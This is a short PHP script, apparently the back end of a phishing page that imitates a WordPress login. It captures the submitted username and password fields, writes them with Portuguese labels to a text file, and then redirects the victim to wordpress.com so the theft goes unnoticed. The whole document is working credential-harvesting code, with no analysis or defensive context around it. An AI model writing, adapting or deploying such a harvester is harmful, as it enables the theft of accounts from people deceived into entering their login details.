<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['log'] . " Senha: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location: https://wordpress.com');
exit();
